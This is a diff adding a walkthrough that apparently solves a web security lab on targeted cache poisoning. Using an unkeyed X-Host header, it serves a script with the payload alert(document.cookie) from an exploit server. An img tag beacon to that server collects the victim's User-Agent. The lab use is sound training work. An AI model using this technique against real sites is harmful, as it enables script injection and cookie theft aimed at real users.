@@ -1,0 +1,29 @@
+Solution Steps:
+
+1. Load the home page with Burp Suite running.
+2. In Proxy → HTTP history, find the GET / request.
+3. Use Param Miner → Guess headers and identify the hidden header:
+   X-Host
+4. Send the request to Repeater and add a cache-buster parameter.
+5. Add:
+   X-Host: example.com
+   and verify it controls the URL of:
+   /resources/js/tracking.js
+6. On the Exploit Server, create:
+   /resources/js/tracking.js
+7. Add the payload:
+   alert(document.cookie)
+   and store the exploit.
+8. Set:
+   X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+9. Send the request until the exploit server URL is reflected and the response contains:
+   X-Cache: hit
+10. Verify the payload by loading the URL in the browser.
+11. Post the following comment:
+    <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+12. Open the Access log on the Exploit Server and wait for the victim request.
+13. Copy the victim's User-Agent from the log.
+14. In Burp Repeater, paste the victim's User-Agent into the User-Agent header and remove the cache-buster.
+15. Keep sending the request until the response reflects your exploit server URL and shows:
+    X-Cache: hit
+16. Continue replaying the request until the victim visits the poisoned cache and the lab is solved.
